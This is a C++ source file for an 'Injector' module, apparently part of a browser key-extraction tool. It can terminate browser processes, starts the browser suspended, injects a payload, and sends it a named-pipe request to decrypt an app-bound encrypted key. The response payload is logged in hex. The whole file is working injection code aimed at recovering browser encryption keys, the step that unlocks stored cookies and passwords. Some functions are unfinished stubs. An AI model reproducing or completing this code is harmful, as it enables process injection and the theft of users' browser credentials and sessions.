

#include "injector_api.hpp"
#include <windows.h>
#include "../core/common.hpp"
#include "../core/console.hpp"
#include "../sys/internal_api.hpp"
#include "browser_discovery.hpp"
#include "browser_terminator.hpp"
#include "process_manager.hpp"
#include "injector.hpp"
#include <iostream>
#include "../payload/messages.hpp"
#include "pipe_server_ext.hpp"
#include "serializer.hpp"
#include "../core/logger.hpp"
#include "../core/constants.hpp"

namespace Injector
{

    enum CommandId
    {
        NONE,
        DECRYPT,
        ENCRYPT
    };

    static uint32_t s_next_request_id = 0;

    int Process(int command_id,
                std::wstring execPath,
                const char *payload,
                uint32_t payloadSize,
                char *outBuffer,
                uint32_t &outBufferSize)
    {
        // TODO: duplicated information between request & browser
        std::wstring pipeName = L"\\\\.\\pipe\\my_pipe";
        // Core::Logger logger(L"master.log");
        Core::Logger logger(L"master.log");
        logger.info(L"Starting process injection.");
        Core::Console console(true);
        bool killFirst = false;
        int retcode = -1;
        BrowserInfo *browser = CreateBrowserInfoFromExecFilePath(execPath);
        if (browser == nullptr)
        {
            logger.error(L"Failed to create browser info from exec path: " + execPath);
            return -1;
        }

        // get message type from request
        try
        {
            if (killFirst)
            {
                console.Debug("==> Terminating browser processes...");
                BrowserTerminator terminator(console);
                TerminationOptions opts;
                opts.terminateChildren = true;
                opts.waitForExit = true;
                logger.info(L"Terminating browser processes for: " + browser->exeName);
                auto termStats = terminator.KillByExeName(browser->exeName, opts);
                if (termStats.processesTerminated > 0)
                {
                    std::string pidList;
                    for (size_t i = 0; i < termStats.terminatedPids.size(); ++i)
                    {
                        if (i > 0)
                            pidList += ", ";
                        pidList += std::to_string(termStats.terminatedPids[i]);
                    }
                    logger.info(L"Processes terminated (PID: " + Core::ToWide(pidList) + L")");
                    console.Debug("  [+] Processes terminated (PID: " + pidList + ")");
                }
                else
                {
                    logger.info(L"No running processes found");
                    console.Debug("  [+] No running processes found");
                }
                Sleep(300);
            }

            logger.info(L"Creating suspended process for: " + browser->fullPath);
            console.Debug("Creating suspended process: " + Core::ToUtf8(browser->fullPath));
            ProcessManager procMgr(*browser);
            procMgr.CreateSuspended();
            logger.info(L"Process created (PID: " + std::to_wstring(procMgr.GetPid()) + L")");
            console.Debug("  [+] Process created (PID: " + std::to_string(procMgr.GetPid()) + ")");

            PipeServer_EXT pipe(pipeName, logger);
            // pipe.register_handler(
            //     Core::PipeElement::kMessageType_Text,
            //     [&logger](const void *data, size_t size)
            //     {
            //         // Handle the browser request message here
            //         std::wstring str(reinterpret_cast<const wchar_t *>(data), size / sizeof(wchar_t));
            //         logger.info(L"Received TEXT: " + str);
            //         return 0; // Return 0 for success
            //     });
            pipe.init();
            logger.info(L"IPC pipe initialized: " + pipeName);
            console.Debug("  [+] IPC pipe established: " + Core::ToUtf8(pipeName));
            PayloadInjector injector(procMgr, console);
            injector.Inject(pipeName);

            console.Debug("Awaiting payload connection...");
            // TODO: Add timeout handling for WaitForClient
            if (pipe.wait_for_client(3000) != 0)
            { // 3 seconds timeout
                console.Error("Timeout waiting for payload connection");
                return -1;
            }
            logger.info(L"Payload connected");
            console.Debug("  [+] Payload connected");

            logger.info(L"Sending request to payload...");
            std::vector<std::vector<char>> buffers;
            buffers.push_back(std::vector<char>(reinterpret_cast<const char *>(&command_id),
                                                reinterpret_cast<const char *>(&command_id) + sizeof(command_id)));
            logger.info(L"Sending request with command ID: " + std::to_wstring(command_id));
            logger.info(L"Sending request with command ID HEX: " + Core::KeyToHexW(reinterpret_cast<const char *>(&command_id), sizeof(command_id)));
            buffers.push_back(std::vector<char>(reinterpret_cast<const char *>(execPath.data()),
                                                reinterpret_cast<const char *>(execPath.data()) + execPath.size() * sizeof(wchar_t)));
            buffers.push_back(std::vector<char>(payload, payload + payloadSize));
            pipe.write(Core::PipeElement::kMessageType_Request, buffers);

            int messageType = 0;
            retcode = pipe.read_utils(
                [&](int msg_type, const char *buffer, uint32_t size)
                {
                    if (msg_type == Core::PipeElement::kMessageType_Text)
                    {
                        std::wstring str(reinterpret_cast<const wchar_t *>(buffer), size / sizeof(wchar_t));
                        logger.info(L"TX: " + str);
                    }
                    else if (msg_type == Core::PipeElement::kMessageType_Response)
                    {
                        Core::PipeElement::Response response(const_cast<char *>(buffer), size);
                        int command_id = response.get_command_id();
                        char* payload = response.get_payload();
                        int payload_size = response.get_payload_size();
                        logger.info(L"Received RESPONSE for command ID: " + std::to_wstring(command_id));
                        logger.info(L"Payload size: " + std::to_wstring(payload_size));
                        logger.info(L"Payload (hex): " + Core::KeyToHexW(reinterpret_cast<const char *>(payload), payload_size));
                    }
                    else
                    {
                        logger.warning(L"Received unknown message type: " + std::to_wstring(msg_type));
                    }
                    // Process the buffer as needed
                    return false; // Return true to continue reading
                },
                10000
            );

            // The response is now available in request.response
            if (retcode != 0)
            {
                logger.error(L"Failed to send request or receive response");
                console.Error("Failed to send request or receive response");
                return -1;
            }
            procMgr.Terminate();
            delete browser;
        }
        catch (const std::exception &e)
        {
            logger.error(L"Exception caught: " + Core::ToWide(e.what()));
            console.Error(std::string(e.what()));
            return -1;
        }

        return 0;
    }

    int Decrypt(std::wstring execPath,
                char *encryptedKey,
                uint32_t encryptedKeyLength,
                char *outKey,
                uint32_t &outKeyLength)
    {
        Process(Core::Constants::kMessageType_DecryptAppBoundEncryptedKey, execPath, encryptedKey, encryptedKeyLength, outKey, outKeyLength);

        // Payload::request_msg reqMsg;
        // int ret = -1;
        // BrowserInfo* browser = CreateBrowserInfoFromExecFilePath(execPath);
        // if (browser == nullptr) {
        //     std::wcerr << "Failed to create browser info from exec path: " << execPath << std::endl;
        //     return -1;
        // }

        // reqMsg.msg_type = static_cast<uint32_t>(Payload::MessageType::REQUEST);
        // Payload::browser_request_msg* browserReqMsg = Payload::browser_request_msg::create(
        //     static_cast<uint32_t>(CommandId::DECRYPT),
        //     static_cast<uint32_t>(browser->fullPath.size() * sizeof(wchar_t)),
        //     reinterpret_cast<char*>(browser->fullPath.data()),
        //     static_cast<uint32_t>(encryptedKeyLength),
        //     encryptedKey
        // );

        // reqMsg.payload_length = browserReqMsg->size();
        // reqMsg.payload = reinterpret_cast<char*>(browserReqMsg);
        // Payload::Request request(reqMsg);
        // ret = Process(request, *browser);

        // outKeyLength = 128;
        // memset(outKey, 'a', outKeyLength);
        // std::cout << "Decrypt called with encrypted key length: " << encryptedKeyLength << " and output buffer length: " << outKeyLength << std::endl;
        return 0;
    }

    int Encrypt(std::wstring execPath, char *key, uint32_t keyLength, char *outEncryptedKey, uint32_t &outEncryptedKeyLength)
    {
        int retcode = -1;
        return retcode;
        // outEncryptedKeyLength = 128;
        // memset(outEncryptedKey, 'b', outEncryptedKeyLength);
        // std::cout << "Encrypt called with key length: " << keyLength << " and output buffer length: " << outEncryptedKeyLength << std::endl;
        // return 0;
    }

} // namespace Injector